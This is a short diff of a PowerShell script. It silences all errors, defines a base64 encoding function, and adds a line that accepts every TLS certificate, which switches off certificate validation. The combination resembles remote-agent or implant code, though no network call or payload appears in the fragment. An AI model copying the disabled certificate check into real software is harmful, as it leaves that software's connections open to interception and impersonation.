@@ -1,4 +1,5 @@
 $ErrorActionPreference = 'SilentlyContinue';
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 function Encode64{
 param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}
 };
